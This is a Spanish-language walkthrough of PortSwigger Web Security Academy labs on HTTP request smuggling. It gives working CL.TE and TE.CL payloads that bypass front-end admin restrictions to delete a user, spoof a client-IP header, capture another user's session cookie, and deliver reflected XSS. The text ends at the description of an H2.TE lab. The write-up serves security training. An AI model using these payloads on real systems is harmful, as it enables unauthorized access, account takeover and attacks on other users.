## Reto 1: Contrabando de solicitudes HTTP, confirmación de una vulnerabilidad CL.TE mediante respuestas diferenciales


Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que se pueda realizar una solicitud posterior. /(la raíz web) activa una respuesta 404 No encontrado. 

Modificamos el `Content-Length: 41` y el `Transfer-Encoding: chunked` y añadimos un solicitud a un sitio que no existe con una cabecera de ejemplo para que sea aceptada , finalmente obtenemos el error 404.

```
POST / HTTP/1.1
Host: 0ad4003703e8c88f80e8d651003d00e3.web-security-academy.net
Content-Length: 41
Transfer-Encoding: chunked
3
abc
0
GET /error HTTP/1.1
Test: A
```

## Reto 2: Contrabando de solicitudes HTTP, confirmación de una vulnerabilidad TE.CL mediante respuestas diferenciales

Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor back-end no admite la codificación fragmentada.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end, de modo que se pueda realizar una solicitud posterior. `/` (la raíz web) activa una respuesta 404 No encontrado. 

Esta variante de HTTP request smuggling basada en la combinación TE.CL, donde el front-end permite codificación chunked y el back-end no. El objetivo es verificar si existe una desincronización entre ambos servidores manipulando los encabezados de longitud y codificación de la petición.

A través de dos envíos consecutivos desde Burp Repeater, provocamos una situación donde la segunda petición se ve afectada por los restos interpretados desde la primera, desencadenando una respuesta 404 inesperada en la raíz del sitio. 
```
POST / HTTP/1.1
Host: 0a5a00c8041eb13b81eaac5a007c0028.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4
38
POST /error HTTP/1.1
Content-Length: 30
testing=test
0
```
## Reto 3: Explotación del contrabando de solicitudes HTTP para eludir los controles de seguridad del frontend, vulnerabilidad CL.TE

Este laboratorio implica un servidor front-end y uno back-end, y el servidor front-end no admite la codificación fragmentada. Hay un panel de administración en /admin, pero el servidor front-end bloquea el acceso a él.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end que accede al panel de administración y elimina al usuario. carlos. 

Aplicamos la técnica de HTTP request smuggling con una combinación CL.TE para evadir controles de acceso impuestos por el front-end. El objetivo es acceder al panel de administración, normalmente restringido, y eliminar al usuario carlos desde el back-end.

Para ello, construimos una petición maliciosa que el front-end interpreta como finalizada tras leer los bytes indicados por Content-Length, pero que en realidad contiene una segunda petición HTTP embebida. Esta segunda petición es procesada por el back-end de forma independiente y sin las restricciones del front-end, lo que nos permite interactuar con rutas protegidas como /admin o /admin/delete.

```
POST / HTTP/1.1
Host: 0a0d00b503aada46808c80b800650056.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Transfer-Encoding: chunked
0
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 12
test=test
```

## Reto 4: Explotación del contrabando de solicitudes HTTP para eludir los controles de seguridad del frontend, vulnerabilidad TE.CL

Este laboratorio implica un servidor front-end y uno back-end, y el servidor back-end no admite la codificación fragmentada. Hay un panel de administración en /admin, pero el servidor front-end bloquea el acceso a él.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end que accede al panel de administración y elimina al usuario. carlos. 

Explotamos una vulnerabilidad TE.CL (Transfer-Encoding + Content-Length) para realizar HTTP request smuggling y evadir las restricciones de acceso impuestas por el front-end. El objetivo es acceder a rutas protegidas como /admin o /admin/delete que no están disponibles directamente desde el navegador.

Utilizamos una petición malformada con codificación chunked para engañar al front-end y que interprete una longitud de contenido más corta de lo que realmente se está enviando. Esto permite que el back-end procese una segunda petición embebida que el front-end nunca llega a validar.

Durante la clase, mostramos cómo construir y ajustar la petición smuggled para que incluya la cabecera ‘Host: localhost‘, necesaria para que el back-end acepte la acción administrativa.

```
POST / HTTP/1.1
Host: 0a0b008303b3ce7b806a802f002c006c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4
5f
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 25
test=testing
0
```
## Reto 5: Explotación del contrabando de solicitudes HTTP para revelar la reescritura de solicitudes del frontend

Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada.

Hay un panel de administración en /admin, pero solo es accesible para personas con la dirección IP 127.0.0.1. El servidor front-end agrega un encabezado HTTP a las solicitudes entrantes que contienen su dirección IP. Es similar a... X-Forwarded-For encabezado pero tiene un nombre diferente.

Para resolver el laboratorio, envíe una solicitud al servidor backend que revele el encabezado agregado por el servidor frontend. Luego, envíe una solicitud al servidor backend que incluya el encabezado agregado, acceda al panel de administración y elimine al usuario. carlos. 

aprovechar una vulnerabilidad de HTTP request smuggling para identificar cabeceras que el servidor front-end añade a las peticiones entrantes. Estas cabeceras pueden determinar el acceso a zonas restringidas, como el panel de administración.

Primero, utilizamos un ataque de tipo CL.TE para inyectar una petición secundaria y observar cómo el front-end reescribe el tráfico. Al examinar la respuesta del back-end, logramos identificar la cabecera que transporta la IP del cliente. Luego, reproducimos el ataque incluyendo esta cabecera manualmente con el valor 127.0.0.1, lo que nos permite acceder al panel /admin.

Finalmente, modificamos la petición smuggled para apuntar a ‘/admin/delete?username=carlos‘

```
POST / HTTP/1.1
Host: 0aeb00b8037a64b1801c672d008d0005.web-security-academy.net
Cookie: session=ZlxWzuMP3ud4EAOcfMPTBDBcD86HSDi8
Content-Length: 106
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
0
GET /admin/delete?username=carlos HTTP/1.1
X-wbTTHP-Ip: 127.0.0.1
Content-Length: 13
search=test
```

## Reto 6: Explotación del contrabando de solicitudes HTTP para capturar las solicitudes de otros usuarios 


Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada. Para resolver el laboratorio, envíe una solicitud al servidor backend de forma clandestina, lo que provocará que la solicitud del siguiente usuario se almacene en la aplicación. Luego, recupere la solicitud del siguiente usuario y use las cookies del usuario víctima para acceder a su cuenta.

logramos capturar una petición legítima del siguiente usuario mediante un ataque de HTTP request smuggling. En esta parte, analizamos el contenido del comentario almacenado para extraer la cookie de sesión de la víctima.

Una vez identificamos el valor de la ‘cookie session‘ en la petición capturada, la utilizamos para suplantar la identidad del usuario y acceder a su cuenta. Este paso demuestra cómo una simple desincronización entre servidores puede derivar en la total toma de control de una cuenta ajena.

```
POST / HTTP/1.1
Host: 0a1600ee032ff18a80fa3ab200a40000.web-security-academy.net
Content-Length: 278
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
0
POST /post/comment HTTP/1.1
Cookie: session=G3hQ5rPsQkWhgVNsUporKSntyTG2eFnv
Content-Type: application/x-www-form-urlencoded
Content-Length: 950
csrf=2589KdABOiSwgsRJOipAkDFtso8MIhqX&postId=2&name=test&email=test%40test.com&website=https%3A%2F%2Ftest.com&comment=test
```

## Reto 7: Explotación del contrabando de solicitudes HTTP para entregar XSS reflejado


Este laboratorio implica un servidor front-end y un servidor back-end, y el servidor front-end no admite la codificación fragmentada.

La aplicación también es vulnerable a XSS reflejado a través de User-Agentencabezado.

Para resolver el laboratorio, envíe de contrabando una solicitud al servidor back-end que haga que la siguiente solicitud del usuario reciba una respuesta que contenga un exploit XSS que se ejecute. alert(1)

combinamos un ataque de HTTP request smuggling con una vulnerabilidad de XSS reflejado que afecta a la cabecera User-Agent. El objetivo es hacer que la siguiente petición de un usuario legítimo reciba una respuesta que incluya nuestra carga maliciosa.

Para lograrlo, manipulamos la longitud de la petición y ocultamos una petición HTTP secundaria con el ‘User-Agent‘ alterado. La víctima, al visitar la aplicación, carga sin saberlo una página que ejecuta JavaScript, concretamente ‘alert(1)‘, validando la explotación.

```
POST / HTTP/1.1
Host: 0ab7006304ba3ab380000333002a003d.web-security-academy.net
Content-Length: 72
Transfer-Encoding: chunked
0
GET /post?postId=9 HTTP/1.1
User-Agent:"><script>alert(1)</script>
```

## Reto 8: Envenenamiento de la cola de respuesta mediante contrabando de solicitudes H2.TE

Este laboratorio es vulnerable al contrabando de solicitudes porque el servidor front-end degrada las solicitudes HTTP/2 incluso si tienen una longitud ambigua.

Para resolver el laboratorio, elimine el usuario. carlosmediante el uso del envenenamiento de la cola de respuesta para entrar en el panel de administración en /adminUn usuario administrador iniciará sesión aproximadamente cada 15 segundos.

La conexión con el back-end se restablece cada 10 solicitudes, así que no te preocupes si la colocas en mal estado: simplemente envía algunas solicitudes normales para obtener una nueva conexión. 